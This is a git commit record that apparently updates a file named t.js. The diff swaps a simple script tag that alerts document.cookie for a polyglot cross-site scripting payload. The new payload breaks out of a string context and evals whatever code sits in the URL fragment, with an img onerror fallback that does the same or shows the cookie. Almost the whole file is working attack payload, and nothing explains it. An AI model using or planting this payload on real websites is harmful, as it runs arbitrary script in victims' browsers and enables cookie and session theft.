7db149f6c1a75f9e760a5fc469a935649b3e3667
nb1b3k <35418661+nb1b3k@users.noreply.github.com>
2021-08-15 09:48:43 +0545

    Update t.js

--- t.js
+++ t.js
@@ -1,1 +1,2 @@
-<script>alert(document.cookie)</script>
+'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(1)}//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert(document.cookie)}">
+msgbox+1
